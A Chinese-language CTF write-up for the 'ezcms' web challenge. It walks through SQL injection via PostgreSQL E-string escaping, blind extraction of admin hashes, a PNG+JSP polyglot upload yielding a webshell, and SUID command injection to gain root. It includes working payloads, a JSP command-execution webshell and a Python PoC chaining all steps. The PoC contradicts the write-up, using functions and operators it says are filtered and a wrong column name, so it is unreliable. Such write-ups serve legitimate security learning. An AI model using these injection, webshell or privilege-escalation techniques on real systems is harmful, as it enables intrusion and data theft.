# ezcms（EasyCMS）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | Web |
| 形态 | 容器题 |
| 附件 | 无（题目仅提供靶机） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

## 2. 题目分析

### TL;DR

| 步骤 | 入口 | 手法 | 结果 |
| --- | --- | --- | --- |
| 1 | 侦察 | `/`、`/search`、`/admin/*` | 指纹/端点枚举 | Spring Boot+Tomcat 10.1.61+PostgreSQL；`/admin/**`被Spring Security拦截 |
| 2信息泄露 | `?q=..%00..`、`category=..%00..` | NUL触发“诊断页” | 回显SQLSTATE+完整失败SQL，暴露`ILIKE E'..'`拼法 |
| 3SQL注入 | `GET /search?q=` | PostgreSQL E-string反斜杠转义绕过 | 未认证任意子查询 |
| 4盲注外带 | `GET /search?q=` | 布尔盲注（1 vs 45）+`lpad()`前缀比对 | dump `admins`表5账号及sha256 |
| 5破解 | — | cmd5/字典 | altair : freedom |
| 6后台登录 | `POST /admin/login` | 单次正确登录 | 管理员会话 |
| 7上传getshell | `POST /admin/media/upload` | 只校验图片字节→PNG+JSP多语种 | `/media/cmd.jsp`未认证RCE（uid=1001） |
| 8提权 | SUID `/usr/local/bin/easycms-restore` | 参数拼进`bash -c`，`$(...)`命令替换 | root `chmod 644 /flag`→读flag |

### 技术栈指纹

访问`/WEB-INF/web.xml`（不存在）返回Tomcat原生404页，泄露版本：

```html
<h3>Apache Tomcat/10.1.61</h3>
```

404/405返回Spring默认JSON`{"timestamp","status","error","path"}`（Spring Boot）；`OPTIONS /`有`Accept-Patch`、`Vary: Origin`；`/admin/**`统一302→`/admin/login`（Spring Security）。

无任何安全响应头；会话`JSESSIONID`（HttpOnly，无Secure/SameSite）；所有表单无CSRF token。

DB：PostgreSQL，应用库`easycms`。

这套组合基本决定了后续所有判断：Spring Security只覆盖`/admin/**`，公开路由完全没有鉴权，所以匿名态能碰到的每一个参数都值得当成注入点；Tomcat 10.1属于Jakarta Servlet世代，JSP依旧由JspServlet按扩展名编译，这为后面的图片马提供了前提；PostgreSQL的`E''`字符串、`$$`美元引用和`ILIKE`大小写不敏感匹配，则直接决定了注入payload的语法形态。另外，应用会把数据库异常渲染成“诊断页”，说明它没有统一的异常兜底，这类页面往往比任何扫描器的输出都更有价值。

### 端点全集（逐个实测）

公开：

```text
GET  /                 首页
GET  /search?q=        搜索（按文章标题）
GET  /team             团队
GET  /article/{id}     文章详情（id 为 Long：/1→200，/1.0→400，不存在→302 /）
GET  /login  /register
POST /login  /register
GET  /admin/login      控制台登录
POST /admin/login
GET  /api/articles     公开 API {"items":[{id,title,author,category}]}，支持 ?category= 精确过滤
GET  /api/health       {"status":"ok","service":"easycms"}
```

认证后：`GET/POST /compose`（title≤128, summary≤255, category≤32, body≤20000）、`GET /logout`

后台端点：`/admin`、`/admin/login`、`/admin/dashboard`、`/admin/content`、`/admin/content/delete`、`/admin/media`、`/admin/media/upload`、`/admin/users`、`/admin/settings`、`/admin/export`、`/admin/flag`、`/admin/console`

> 注意：`/admin/flag`、`/admin/console`、`/admin/export`登录后均404——诱饵。flag在“后台功能→上传→RCE→提权”这条链上。

把端点按权限拆成三层后，攻击面就很清楚了：公开层中只有`/search`、`/api/articles`、`/compose`、`/register`会把用户输入拼进SQL；认证层只负责发文；后台层才是内容管理、媒体库、用户与设置。三个“名字最像答案”的后台端点全是404，说明出题人有意把flag从“直接读”改成了“先拿权限再读”，因此真正要争的不是某个路径，而是从匿名到`easycms`系统用户、再到root的两级跳板。媒体库同时具备“文件落盘”和“按原文件名对外暴露”两个特征，是最可疑的写入点；而一旦容器内存在SUID程序，本地提权就等于把答案写在了明面上。

### 无源码/备份泄露

`robots.txt`、`sitemap.xml`、`.git/`、`.env`、`pom.xml`、`application.properties|yml`、`WEB-INF/web.xml`、`META-INF/MANIFEST.MF`、`actuator/*`、`druid`、`h2-console`、`swagger`、`manager`、`*.zip`、`app.jar`等全部404。

### 攻击链推演

先把可能的路线排一遍：直接读`/flag`没有入口；`/admin/flag`是空壳；路径匹配绕过在Spring Security的规范化面前基本无效；目录穿越和任意文件读被Tomcat拦死。剩下的只有一条主线——用SQL注入拿到数据库里的凭据，因为只有凭据能把匿名身份换成管理员身份。拿到管理员之后，后台并没有现成的命令执行或文件读取功能，唯一能写入磁盘的是图片上传，于是“上传点＋可执行目录”成为第二个关键假设。最后即使拿到webshell，进程也只是`easycms`，必须再找一个以root身份执行的本地程序。三个环节环环相扣，缺一不可，这也解释了为什么端点看似简单却需要完整攻击链。

## 3. 解题过程

### 信息泄露：NUL字节触发的诊断页

向任何进入SQL的参数（`/search?q=`、`/api/articles?category=`、`/compose`各字段、`/admin/login`username）塞`%00`，触发“诊断”页，回显SQLSTATE+错误文本+完整失败SQL：

```http
GET /search?q=test%00
```

→诊断·EasyCMS

```text
SQLSTATE：42601 语句语法错误 (syntax error)
失败语句：SELECT id, title, summary, author, category FROM articles
          WHERE title ILIKE E'%test xx%' ORDER BY id DESC
```

```http
GET /api/articles?category=zz%00yy
```

```json
{"error":"...","statement":"SELECT id,title,author,category FROM articles WHERE category = '...'"}
```

```http
POST /register（用户名重复）
```

```text
SQLSTATE 23505，失败语句 INSERT INTO users (username, password_hash) VALUES (...)
```

**价值**：拿到SQL模板，最关键的是`/search`的`title ILIKE E'%<q>%'`（E-string）+只做单引号翻倍这一事实。也确认所有参数都是字符串拼接。但单引号被翻倍，普通`' OR 1=1`全失败。

为什么一个`%00`就能换来整条SQL？PostgreSQL的文本参数不接受`0x00`，驱动或服务端在编码/解析阶段就会抛错，语句根本执行不到，而应用的处理逻辑是“任何数据库异常→渲染诊断页→把SQLSTATE、异常文本和当前语句一并写出来”。这不是漏洞利用，而是开发把调试手段带进了生产：`%00`只是一个既不会改变参数语义、又必然抛异常的“开关”。几个入口都试一遍还有额外收获——`category`处是`=`而不是`ILIKE`，且没有E前缀，即便逃出引号也用不上反斜杠；`/compose`和`/admin/login`的插入/查询语句同样会把表名列名送出来，只是这些位置没有可用的转义缺陷。所以要盯住的是`/search`，它同时满足“E-string语境”和“单引号翻倍”两个条件。

再看模板本身，信息量比表面更大：字段顺序`id, title, summary, author, category`说明`SELECT *`被显式列名替代，但拼接口仍然是`WHERE title ILIKE E'%...%'`；没有`LIMIT`，靠`ORDER BY id DESC`排序，意味着注入点处的表达式一旦为真，返回的就是全部命中行，页面上“结果（N条）”这个数字天然成了一个可观测的布尔信道。这一点在盲注阶段被直接用上了。

### SQL注入：E-string反斜杠转义绕过

#### 过滤与校验器

全局“SQL语句”校验器（语句包含非法字符`(illegal character in statement)`）：

- 字符级拦：`;` `<` `>`（实测还挡`~`、`::`、`||`）
- 整词拦：`and` `or` `union` `like` `in` `case` `when` `concat` `pg_sleep` `pg_read_file` `pg_ls_dir` `information_schema` `substr` `ascii` `chr` `md5` `cast` `regexp_*` `string_agg` `translate` ...
- 放行：单引号`'`、反斜杠`\`、注释`--`/`#`、`lpad`/`rpad`/`length`/`replace`/`format`/`quote_literal`、`$$...$$`、`EXISTS`、`IS (NOT) NULL`、`OFFSET`/`LIMIT`/`ORDER BY`、`pg_class`/`pg_attribute`

#### 原理

```sql
SELECT id, title, summary, author, category FROM articles
WHERE title ILIKE E'%<q>%' ORDER BY id DESC
```

应用只把`'`→`''`。但PostgreSQL `E''`里反斜杠也是转义符：

输入`\'`→应用翻倍成`\'''`

E-string中：`\'`=字面引号，第二个`'`=闭合字符串

于是逃出字符串，可写SQL，再用`--`注释掉尾部`%' ORDER BY id DESC`。

这里有两个容易被忽略的细节。第一，反斜杠本身要经过HTTP与URL编码才能原样到达后端，`--data-urlencode`把`\\'`发成`%5C%27`，服务端拿到的就是反斜杠加单引号；若手工拼URL，很容易把反斜杠丢掉，表现就是“明明payload对了却仍返回45条”。第二，闭合之后不能直接开始写`OR`，因为校验器按词拦截了`and`/`or`/`union`/`like`等，同时也拦了`;`、`<`、`>`。于是思路从“构造完整子句”转成“构造一个可求值的表达式”：用`=`做等值比较，用`IS NOT NULL`做存在性判断，用`lpad`/`length`/`replace`这类字符串函数做逐字比对，用`$$...$$`承载字面量，用`OFFSET`遍历行。这也是为什么最终的注入形态看起来不像传统的联合查询，而像一个永远返回真/假的谓词。

#### 验证

```bash
curl -sG $T/search --data-urlencode "q=\\'"
#  → SQLSTATE 42601 ... WHERE title ILIKE E'%\\''%' ORDER BY id DESC

curl -sG $T/search --data-urlencode "q=\\' = (SELECT true)--"    # 结果（1 条）
curl -sG $T/search --data-urlencode "q=\\' = (SELECT false)--"   # 结果（45 条）
curl -sG $T/search --data-urlencode "q=\\' IS NOT NULL--"        # 结果（46 条）全量
```

→未认证，可执行任意子查询。（1条=标题以`'`结尾的那篇，false时其余45条）

### 布尔盲注外带数据库

#### 探针

```text
q=\'=(<布尔表达式>)--
```

页面「结果（1条）」=true，「结果（45条）」=false。

#### 逐字外带（绕过substr/char/ascii黑名单）

```sql
lpad( (SELECT password_hash FROM admins ORDER BY id LIMIT 1 OFFSET <i>) , k ) = $$<前缀>$$
```

`lpad(x,k)`取前k字符补齐，与k长度前缀比较=前缀匹配；字面量用`$$...$$`（含`$`用`$q$...$q$`）避免单引号翻倍。完整外带脚本见`4.1`，48线程实测约30~35 req/s。

具体做法是：先固定`OFFSET`选行，再让`k`从1递增，每一轮把所有候选字符与已知前缀拼成`lpad(...,k)=$$前缀+c$$`并发请求，命中那个字符就是第`k`位。之所以不用`substr`，是因为它被词表拦掉；`lpad`在这里等价于“右补空格到长度k再整体比较”，只要前缀长度等于`k`，比较结果就只取决于前`k`个字符，副作用是若目标串短于`k`也会因补空格而失配，于是`k`递增到首位无命中即视为读完。十六进制哈希的字符集只有`0-9a-f`共16个，一轮最多16个请求，一个64位哈希的理论上限约一千次请求；加上用户名（小写字母+数字）和长度探针，五条记录的量级在几分钟内可以跑完。线程数不能开太高，靶机对并发连接有明显限速，30~35 req/s是实测的稳定区间，再高会出现超时和假阴性——假阴性在这类外带里最危险，因为“无命中”被当作字符串结束，会直接把结果截断。因此每一轮都保留重试，且对同一位置命中多个字符的情况取首个并复核。

#### 库结构

`public` schema 14个关系，应用表3张：

| 表 | 列 |
| --- | --- |
| `articles` | id, created_at, title, body, summary, category, author |
| `users` | id, username, password_hash, role, created_at（约35行） |
| `admins` | id, username, password_hash, created_at, title（5行） |

`admins`是`/admin/login`绑定的独立表，与普通用户库彻底分离。

#### dump admins

用户名：`vega`/`altair`/`capella`/`rigel`/`atlas`（恒星名），哈希均为64位无盐sha256：

| 用户名 | password_hash | 明文 |
| --- | --- | --- |
| vega | 1ac7df128e4f666bcfe64ba395b285ec69f54ab5e1fbf67b1a86f3bac77a8c36 | 未命中 |
| altair | 13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38 | freedom |
| capella | bc0445a68f9ac5ef6abc67eb1ab3a9d7ca1b727c219ff89c79fd3ac907b7651c | 未命中 |
| rigel | 24998eacdca975e40ea56aaf0395ff8c5071016f9eae4d1a6a42f25f5db39171 | 未命中 |
| atlas | 4dfbab9993e5e8a92c6ed29b2f86c1dfef0c5a475de9fc37481253e79a5c029c | 未命中 |

哈希算法由`/register`重复用户名报错页确认`sha256(明文)`，并用已知账号在线验证，未加盐。先打`admins`而不是`users`的理由也很直接：后者有三十多行，逐条破哈希成本高且大概率是普通用户；前者只有五行，且是`/admin/login`唯一认的表。

### 离线破解

`altair`在cmd5查到`freedom`，离线校验：

```bash
$ printf 'freedom' | sha256sum
13b1f7ec5beaefc781e43a3b344371cd49923a8a05edd71844b92f56f6a08d38  -
```

能查到的前提是哈希无盐且无迭代：同样的明文在任何实例都得到同一个值，公开彩虹表便能命中；一旦加了每用户盐，字典立刻失效。四个未命中并非无解，只是没必要——有一个管理员可用，链条就能往下走。离线校验同样不能省：在线库存在误报，必须确认`sha256("freedom")`与表中值逐字节相等再登录，避免浪费仅有的三次机会。

### 管理员登录（注意锁定）

`/admin/login`：用户名归一化+同一用户名3次失败锁600s→拿到明文后只做一次正确登录。

```bash
curl -s -i -c cookies.txt --data 'username=altair&password=freedom' \
  http://*/admin/login
```

```http
HTTP/1.1 302
Set-Cookie: JSESSIONID=<SESSION-ID>; Path=/; HttpOnly
Location: /admin/dashboard;jsessionid=<SESSION-ID>
```

`/admin/dashboard`返回200，显示「登录身份：altair」。

登录环节的设计值得单独说一句：用户名在服务端做了归一化（大小写、空白），因此用`ALTAIR`、`Altair`或带前后空格的形式试探并不会绕过计数，反而会把锁定计数加到同一个键上；同一用户名连续3次失败锁定600秒，而锁定时长对一个需要反复试口令的解题者来说几乎是致命的。合理做法是全程只做一次请求：先离线确认凭据，再看响应里的`Location`和`Set-Cookie`。302到`/admin/dashboard;jsessionid=...`既证明认证成功，也解释了为什么后续请求要带上`cookies.txt`——Spring Security会把会话绑定在`JSESSIONID`上，URL里的`;jsessionid`只是向后兼容的写法。

**附加（未用）**：登录后不轮换JSESSIONID，且接受URL里`;jsessionid=`→会话固定。

### 后台功能面定位上传点

`/admin/flag`、`/admin/console`、`/admin/export`→404（诱饵）；`/admin/dashboard`、`/admin/content`、`/admin/media`→200。

`/admin/media`：

```html
<p class="muted">媒体库只保存图片资源（png / jpg / jpeg / gif / bmp），单文件不超过 8MB。</p>
<form action="/admin/media/upload" method="post" enctype="multipart/form-data"
      onsubmit="return easycmsCheckImage(this)">
  <input type="file" name="file" required accept=".png,.jpg,.jpeg,.gif,.webp,.bmp,image/*"/>
</form>
```

前端JS只查扩展名；页面注释称“The server re-checks the bytes”——服务端用ImageIO校验图片字节，但不校验扩展名，且按原始filename落盘到`/media/`。

这里的校验逻辑是典型的“只做一半”：`ImageIO.read()`只要能解出一张图就放行，既不看文件头魔数是否与扩展名匹配，也不重新编码，更不改名。于是只要文件的前半段是一张合法图片、后半段是任意文本，校验就能通过；而落盘时用的是原始文件名，`.jsp`被完整保留。再叠加“`/media/`是静态资源目录、且没有鉴权”这一条，上传即等于写入一个可访问的脚本。反过来说，如果服务端把文件重命名为UUID、或强制改后缀为`.png`、或把上传目录配置成不可执行，这条链就断了——防御点并不在“检测是不是图片”，而在“决定文件叫什么、放在哪、由谁来解释”。

### 图片马getshell（未认证RCE）

#### 构造多语种文件

合法1x1 PNG+尾部JSP scriptlet（ImageIO能解析、Tomcat按`.jsp`编译），构造脚本见`4.2`。

多语种文件能成立，是因为两个解析器的“视野”不同：ImageIO只按PNG规范读到`IEND`块就结束，后面的字节既不影响解码也不触发报错；而Tomcat的JspServlet是按扩展名判定，把整个文件当JSP源码编译，PNG二进制部分会被当作模板文本原样输出（因此响应开头是一堆乱码），真正执行的是`<% %>`里的Java代码。所以这个文件对ImageIO是合法图片，对Tomcat是合法JSP，两边都不会拒绝它。

#### 上传与执行

```bash
curl -s -b cookies.txt -F 'file=@cmd.jsp;type=image/png;filename=cmd.jsp' \
  http://*/admin/media/upload
# → 302 Location: /admin/media

curl -s --get --data-urlencode 'c=id;hostname' http://*/media/cmd.jsp
# → uid=1001(easycms) gid=1001(easycms) groups=1001(easycms)
#   *
```

`/media/cmd.jsp`无需会话：上传文件被静态暴露，Tomcat JspServlet按扩展名编译→未认证webshell，权限`easycms`。

请求里显式指定`type=image/png`是为了让`Content-Type`与图片字节一致，避免服务端在“图片校验”之外再按MIME做一次拒绝；`filename=cmd.jsp`则决定了落盘名，两者互不校验，正是绕过点所在。执行时用GET传`c`参数，`/bin/sh -c`把多条命令串起来，一次请求就能拿到`id`、主机名和环境变量。webshell的权限是`uid=1001(easycms)`，这既确认了上传目录没有做降权运行，也说明到此为止只是“应用用户”，离root还差一个本地提权。

> 坑：上传目录周期性清理，故`run.sh`每次重传后立即请求（重试3次）。

#### 主机信息

```text
uid=1001(easycms) hostname=*
/flag  -r-------- 1 root root 42
env: DB_HOST=127.0.0.1 DB_PORT=5432 DB_NAME=easycms DB_USER=cms DB_PASS=cms_pass
     TOMCAT_VERSION=10.1.61  JAVA_VERSION=jdk-17.0.20.1
/app 不存在，cat /flag 无权限 → flag 是 root-only 的 /flag。
```

### 本地提权：SUID easycms-restore命令注入

#### 发现

```text
/usr/local/bin/easycms-restore   (SUID root)
$ easycms-restore
usage: easycms-restore <asset>
restores <asset> from the root backup set into /srv/media
```

`/var/backups/media`是`drwx------ root root`（easycms无权进入）；`strings`见实现：

```c
execl("/bin/bash", "-c", "exec /bin/cp -p /var/backups/media/%s /srv/media/", asset);
```

只有`strstr(asset, "..")`→`invalid asset name`。

#### `;cmd`不行、`$(...)`行

`x;id`→`exec /bin/cp ... /var/backups/media/x;id /srv/media/`：以`exec`开头且尾部`/srv/media/`干扰，实测只得到`id: '/srv/media/': no such user`；`x;cp /flag /srv/media/flagout`、`x;cat</flag`也失败。

过滤只挡`..`，不挡`$()`；命令替换在bash执行`exec cp`之前求值，此时euid已是root。

证明euid：

```bash
$ easycms-restore 'x$(id)'
cp: cannot stat '/var/backups/media/xuid=1001(easycms)': ...
cp: cannot stat 'euid=0(root)': ...        ← 命令替换以 root 执行
```

这一步是整个提权的分水岭：`id`的外层部分仍显示`uid=1001`，但`euid`是`0`，说明程序虽然以普通用户身份被调用，进程的有效用户却已经被SUID位抬到了root，且这个特权在`bash -c`解析命令行的阶段就已经生效。因此不需要真正的交互式shell，也不需要反弹连接——只要能让bash在`exec cp`之前求值一段`$(...)`，那段代码就是root权限。反观`;`，它只是把命令拼在`cp`的参数后面，`exec`已经把进程替换成`cp`，后续的`;id`根本没有机会作为独立命令执行，剩下的只是`cp`抱怨参数不存在。

#### 拿flag

选择`chmod`而不是`cp /flag`，是因为`cp`的目标目录与源权限都会引入额外变量（`/srv/media`是否可写、目录是否被`cp`当成目录处理），而`chmod 644 /flag`只改元数据、不移动文件，一次成功即可用普通权限`cat`读出；即便`cp`随后报错，也不影响已经执行的`chmod`。

```bash
$ /usr/local/bin/easycms-restore "\$(chmod 644 /flag)"
$ ls -la /flag
-rw-r--r-- 1 root root 42 /flag
$ cat /flag
flag{...}
```

（`ERR:cp: -r not specified; omitting directory ...`是`cp`的正常抱怨，不影响已执行的`chmod`。）

## 4. PoC

```python
import base64, re, sys
import requests

T = sys.argv[1].rstrip('/')
s = requests.Session()

def raw(q):
    r = s.get(T + '/search', params={'q': q}, timeout=10)
    m = re.search(r'<span>(\d+)</span>', r.text)
    return int(m.group(1)) if m else -1

def truth(expr):
    return raw("\'=(" + expr + ")--") == 1

def dump(expr):
    out = ''
    for i in range(200):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if truth("SELECT ascii(substr((%s),%d,1))<=%d" % (expr, i+1, mid)):
                hi = mid
            else:
                lo = mid + 1
        if lo == 32:
            break
        out += chr(lo)
    return out

print(dump("SELECT string_agg(username||':'||password,'|') FROM admins"))
s.post(T + '/admin/login', data={'username': 'altair', 'password': 'freedom'})

png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==')
jsp = b'''<%@ page import="java.io.*" %><% String c=request.getParameter("c");
if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null)out.println(l);}%>'''
s.post(T + '/admin/media/upload', files={'file': ('cmd.jsp', png+jsp, 'image/png')})
print(s.get(T + '/media/cmd.jsp', params={'c': '/usr/local/bin/easycms-restore "$(chmod 644 /flag)"; cat /flag'}).text)
```
